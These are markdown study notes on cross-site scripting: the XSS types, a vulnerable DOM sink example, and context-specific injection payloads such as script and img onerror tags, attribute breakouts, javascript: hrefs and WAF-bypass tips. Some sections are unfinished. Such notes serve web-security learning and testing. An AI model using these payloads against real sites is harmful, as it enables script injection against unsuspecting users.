# Cross-site scripting (XSS)

## General info
Cross-site scripting works by manipulating a vulnerable web site so that it returns malicious JavaScript to users

## Alert() limitation
TO DO

## Do not use alert(1)
```
<textarea id="script" onchange=("unsafe(this.value)"></textarea><br>
<iframe id="result" sandbox="allow-scripts allow-modals"></iframe>
```
```
document.session = "secret"
function unsafe(t) {
  var i = document.getElementById('result'); // get the <iframe>
  i.srcdoc = "<body><script>document.write("+t+");<"+"/script><body>";
}
```
- Try `alert(1)` and you see it works... but
- `alert(document.session)` won't work... why?
- `alert(window.origin)` or `alert(document.domain)` and you'll see it's empty
  - this is because the sandboxed iframe also has a different origin. It's isolated from the website it is embedded into and you cannot steal the secret session.
- Use `alert(document.domain)` or `alert(window.origin)` instead 

## Types of XSS
- Reflected XSS, where the malicious script comes from the current HTTP request.
  - `https://insecure-website.com/search?term=<script>/*+Bad+stuff+here...+*/</script>`
- Stored XSS, where the malicious script comes from the website's database.
  - POST example: `comment=%3Cscript%3E%2F*%2BBad%2Bstuff%2Bhere...%2B*%2F%3C%2Fscript%3E`
- DOM-based XSS, where the vulnerability exists in client-side code rather than server-side code.
  - ```
    <script>
    function trackSearch(query) {
      document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
    }
    var query = (new URLSearchParams(window.location.search)).get('search');
    if(query) {
      trackSearch(query);
    }
    </script>
    ```
  - Get request `https://insecure-website.com/index?search="><script>alert(document.domain)<%2Fscript>`
  - Methodology
      1. Look for any script that has a sinks
      2. See if you can control the sink
      3. Exploit it 
  - Note: here there are some sources and sinks
    - https://github.com/wisec/domxsswiki/wiki
    - https://portswigger.net/web-security/cross-site-scripting/dom-based#which-sinks-can-lead-to-dom-xss-vulnerabilities
  - Note 2: DOM Invader (Burp Suite tool) is a browser-based tool that helps you test for DOM XSS vulnerabilities using a variety of sources and sinks. 

### DOM XSS - Sources and sinks in third-party dependencies
To do...

### DOM XSS combined with reflected and stored data
- If a script reads some data from the URL and writes it to a dangerous sink, then the vulnerability is entirely client-side. (there is no processing from the server) 
- Reflected DOM vulnerabilities occur when the server-side application processes data from a request and echoes the data in the response. A script on the page then processes the reflected data in an unsafe way, ultimately writing it to a dangerous sink.
  - `eval('var data = "reflected string"');`
- In a stored DOM XSS vulnerability, the server receives data from one request, stores it, and then includes the data in a later response. A script within the later response contains a sink which then processes the data in an unsafe way.
  - `element.innerHTML = comment.author`

## Cross-site scripting contexts
### XSS between HTML tags
```
<script>alert(document.domain)</script>
<img src=1 onerror=alert(1)>
```
- Bypass WAF
  - If you receive an error like "tag <img> is not allowed" or "event is not allowed", use XSS cheat sheet to discover a tag and event that work.
  - Note: understand how a payload works
    - `<body onresize="print()">` with this payload (for reflected XSS) you need an exploit server and iframe tag
### XSS in HTML tag attributes
- When the XSS context is into an HTML tag attribute value, you might sometimes be able to terminate the attribute value, close the tag, and introduce a new one.
- `"><script>alert(document.domain)</script>`
- More commonly in this situation, angle brackets are blocked or encoded. In this case you can introduce a new attribute that creates a scriptable context.
- `" autofocus onfocus=alert(document.domain) x="`
- Sometimes the XSS context is into a type of HTML tag attribute that itself can create a scriptable context.
  - If the XSS context is into the href attribute of an anchor tag, you can use the javascript pseudo-protocol to execute script
  - `<a href="javascript:alert(document.domain)">`
- accesskey
  - <b>TO DO</b>

